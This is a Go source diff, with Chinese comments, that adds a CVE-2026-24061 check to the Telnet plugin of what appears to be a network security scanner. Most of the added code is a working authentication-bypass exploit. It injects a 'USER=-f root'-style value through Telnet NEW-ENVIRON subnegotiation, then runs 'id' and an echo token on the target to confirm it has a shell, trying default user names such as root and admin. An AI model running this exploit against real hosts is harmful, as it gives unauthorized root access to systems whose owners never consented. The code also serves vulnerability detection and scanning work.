@@ -4,6 +4,7 @@ package services
 
 import (
 	"context"
+	"crypto/rand"
 	"fmt"
 	"net"
 	"strings"
@@ -16,14 +17,26 @@ import (
 
 // Telnet协议时间常量
 const (
-	telnetReadDelay      = 200 * time.Millisecond  // 读取间隔延迟
-	telnetRetryDelay     = 500 * time.Millisecond  // 重试延迟
-	telnetAuthDelay      = 1000 * time.Millisecond // 认证后等待延迟
-	telnetReadTimeout    = 2 * time.Second         // 读取超时
-	telnetBannerTimeout  = 3 * time.Second         // Banner读取超时
-	telnetRCECmdTimeout  = 5 * time.Second         // RCE命令执行超时
-	telnetRCEExtraTimeout = 10 * time.Second       // RCE验证额外超时
-	telnetMaxAttempts    = 10                      // 最大尝试次数
+	telnetReadDelay       = 200 * time.Millisecond  // 读取间隔延迟
+	telnetRetryDelay      = 500 * time.Millisecond  // 重试延迟
+	telnetAuthDelay       = 1000 * time.Millisecond // 认证后等待延迟
+	telnetReadTimeout     = 2 * time.Second         // 读取超时
+	telnetBannerTimeout   = 3 * time.Second         // Banner读取超时
+	telnetRCECmdTimeout   = 5 * time.Second         // RCE命令执行超时
+	telnetRCEExtraTimeout = 10 * time.Second        // RCE验证额外超时
+	telnetMaxAttempts     = 10                      // 最大尝试次数
+)
+
+// CVE-2026-24061 Telnet NEW-ENVIRON 选项常量
+const (
+	telnetIAC        = 0xFF // Telnet Interpret As Command
+	telnetSB         = 0xFA // Subnegotiation Begin
+	telnetSE         = 0xF0 // Subnegotiation End
+	telnetNEWENVIRON = 39   // NEW-ENVIRON option
+	telnetDO         = 0xFD // DO
+	telnetDONT       = 0xFE // DONT
+	telnetWILL       = 0xFB // WILL
+	telnetWONT       = 0xFC // WONT
 )
 
 // TelnetPlugin Telnet扫描插件
@@ -68,6 +81,23 @@ func (p *TelnetPlugin) Scan(ctx context.Context, info *common.HostInfo, config *
 	creds := make([]Credential, len(credentials))
 	for i, c := range credentials {
 		creds[i] = Credential{Username: c.Username, Password: c.Password}
+	}
+
+	// CVE-2026-24061: 使用配置的用户列表检测 Telnetd Authentication Bypass 漏洞
+	cveUsers := config.Credentials.Userdict["telnet"]
+	if len(cveUsers) == 0 {
+		cveUsers = []string{"root", "admin", "administrator"}
+	}
+	for _, user := range cveUsers {
+		if vuln, cveUser, evidence := p.checkCVE202624061(info, config, state, user); vuln {
+			common.LogVuln(i18n.Tr("telnet_cve202624061", target, cveUser, evidence))
+			return &ScanResult{
+				Success: true,
+				Type:    plugins.ResultTypeVuln,
+				Service: "telnet",
+				Banner:  fmt.Sprintf("CVE-2026-24061 Telnetd Authentication Bypass (user: %s)", cveUser),
+			}
+		}
 	}
 
 	// 使用公共框架进行并发凭据测试
@@ -745,6 +775,241 @@ func (p *TelnetPlugin) drainBuffer(conn net.Conn) {
 			break
 		}
 	}
+}
+
+// checkCVE202624061 检测 CVE-2026-24061 Telnetd Authentication Bypass 漏洞
+// 利用 NEW-ENVIRON (option 39) 子协商注入恶意环境变量,实现认证绕过
+// 返回 (是否漏洞, 触发用户名, 证据)
+func (p *TelnetPlugin) checkCVE202624061(info *common.HostInfo, config *common.Config, state *common.State, user string) (bool, string, string) {
+	conn, err := net.DialTimeout("tcp", info.Target(), config.Timeout)
+	if err != nil {
+		return false, "", ""
+	}
+	defer conn.Close()
+
+	chk := &cveChecker{
+		conn: conn,
+		user: user,
+		buf:  make([]byte, 4096),
+	}
+	return chk.run()
+}
+
+// cveChecker CVE-2026-24061 检测器 (基于验证过的 POC 逻辑)
+type cveChecker struct {
+	conn        net.Conn
+	user        string
+	exploitSent bool
+	buf         []byte
+}
+
+// sendPayload 发送 NEW-ENVIRON 恶意环境变量 payload
+func (e *cveChecker) sendPayload() {
+	payload := []byte{telnetIAC, telnetSB, telnetNEWENVIRON, 0, 0}
+	payload = append(payload, []byte("USER")...)
+	payload = append(payload, 1) // SEND indicator
+	payload = append(payload, []byte("-f "+e.user)...)
+	payload = append(payload, telnetIAC, telnetSE)
+	e.conn.Write(payload)
+	e.exploitSent = true
+}
+
+// sendSubResp 响应服务端子协商请求
+func (e *cveChecker) sendSubResp(opt byte, data []byte) {
+	resp := []byte{telnetIAC, telnetSB, opt, 0}
+	resp = append(resp, data...)
+	resp = append(resp, telnetIAC, telnetSE)
+	e.conn.Write(resp)
+}
+
+// parseIAC 解析 Telnet IAC 协商报文,返回非 IAC 数据部分
+func (e *cveChecker) parseIAC(data []byte) []byte {
+	var output []byte
+	i := 0
+	for i < len(data) {
+		if data[i] != telnetIAC {
+			output = append(output, data[i])
+			i++
+			continue
+		}
+		i++
+		if i >= len(data) {
+			break
+		}
+		cmd := data[i]
+		i++
+		if cmd == telnetIAC {
+			output = append(output, 0xFF) // IAC 转义
+			continue
+		}
+		// 子协商 (SB)
+		if cmd == telnetSB {
+			if i >= len(data) {
+				break
+			}
+			sbOpt := data[i]
+			i++
+			var sbData []byte
+			for i < len(data)-1 {
+				if data[i] == telnetIAC && data[i+1] == telnetSE {
+					i += 2
+					break
+				}
+				sbData = append(sbData, data[i])
+				i++
+			}
+			// 服务端要求回显数据 (SEND indicator = 1)
+			if len(sbData) > 0 && sbData[0] == 1 {
+				switch sbOpt {
+				case 24:
+					e.sendSubResp(24, []byte("xterm"))
+				case 32:
+					e.sendSubResp(32, []byte("38400,38400"))
+				case telnetNEWENVIRON:
+					if !e.exploitSent {
+						e.sendPayload()
+					}
+				}
+			}
+			continue
+		}
+		// DO/DONT/WILL/WONT 协商
+		if cmd == telnetDO || cmd == telnetDONT || cmd == telnetWILL || cmd == telnetWONT {
+			if i >= len(data) {
+				break
+			}
+			opt := data[i]
+			i++
+			switch cmd {
+			case telnetDO:
+				if opt == 24 || opt == 32 || opt == telnetNEWENVIRON {
+					e.conn.Write([]byte{telnetIAC, telnetWILL, opt})
+				} else {
+					e.conn.Write([]byte{telnetIAC, telnetWONT, opt})
+				}
+			case telnetWILL:
+				if opt == 1 || opt == 3 {
+					e.conn.Write([]byte{telnetIAC, telnetDO, opt})
+				} else {
+					e.conn.Write([]byte{telnetIAC, telnetDONT, opt})
+				}
+			case telnetWONT:
+				e.conn.Write([]byte{telnetIAC, telnetDONT, opt})
+			case telnetDONT:
+				e.conn.Write([]byte{telnetIAC, telnetWONT, opt})
+			}
+		}
+	}
+	return output
+}
+
+// readAll 读取连接中的所有可用数据
+func (e *cveChecker) readAll() []byte {
+	var out []byte
+	for {
+		e.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
+		n, err := e.conn.Read(e.buf)
+		if err != nil {
+			break
+		}
+		if n > 0 {
+			out = append(out, e.parseIAC(e.buf[:n])...)
+		}
+	}
+	return out
+}
+
+// genToken 生成 16 位随机验证 token
+func (e *cveChecker) genToken() string {
+	b := make([]byte, 8)
+	rand.Read(b)
+	return fmt.Sprintf("%x", b)
+}
+
+// extractEvidence 从输出中提取包含关键词的完整行作为证据,清理 \r 控制字符
+func (e *cveChecker) extractEvidence(data string, keywords []string) string {
+	for _, kw := range keywords {
+		for _, line := range strings.Split(data, "\n") {
+			line = strings.TrimSpace(strings.ReplaceAll(line, "\r", ""))
+			if line != "" && strings.Contains(line, kw) {
+				return "[" + line + "]"
+			}
+		}
+	}
+	return ""
+}
+
+// run 执行 CVE-2026-24061 检测流程
+// 优先级: id 命令 > echo token > shell prompt 特征
+func (e *cveChecker) run() (bool, string, string) {
+	// 阶段 1: IAC 协商
+	e.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+	for {
+		n, err := e.conn.Read(e.buf)
+		if err != nil {
+			break
+		}
+		out := e.parseIAC(e.buf[:n])
+		if len(out) > 0 || e.exploitSent {
+			break
+		}
+	}
+
+	// 协商未触发 exploit 则主动发送
+	if !e.exploitSent {
+		e.sendPayload()
+		time.Sleep(500 * time.Millisecond)
+		for {
+			e.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+			n, err := e.conn.Read(e.buf)
+			if err != nil || n == 0 {
+				break
+			}
+			e.parseIAC(e.buf[:n])
+		}
+	}
+
+	// 阶段 2: id 命令检测 (多次读取确保完整输出)
+	e.conn.Write([]byte("id\n"))
+	time.Sleep(1500 * time.Millisecond)
+
+	var idOutput string
+	for i := 0; i < 3; i++ {
+		part := e.readAll()
+		if len(part) > 0 {
+			idOutput += string(part)
+		}
+		if len(part) == 0 {
+			break
+		}
+		time.Sleep(500 * time.Millisecond)
+	}
+
+	// 检测 1: id 命令输出 (uid=/gid=/root/nobody)
+	evidence := e.extractEvidence(idOutput, []string{"uid=", "gid=", "root", "nobody"})
+	if evidence != "" {
+		return true, e.user, evidence
+	}
+
+	// 阶段 3: echo token 验证
+	token := e.genToken()
+	e.conn.Write([]byte("echo " + token + "\n"))
+	time.Sleep(1 * time.Second)
+
+	result := string(e.readAll())
+	stripped := strings.Replace(result, "echo "+token+"\n", "", 1)
+	if strings.Contains(stripped, token) {
+		return true, e.user, "[echo " + token + "]"
+	}
+
+	// 阶段 4: Shell prompt 特征
+	for _, pp := range []string{"# ", "$ ", "login: ", "Last login:", "Welcome to"} {
+		if strings.Contains(result, pp) {
+			return true, e.user, "[" + strings.TrimSpace(pp) + "]"
+		}
+	}
+
+	return false, "", ""
 }
 
 func init() {
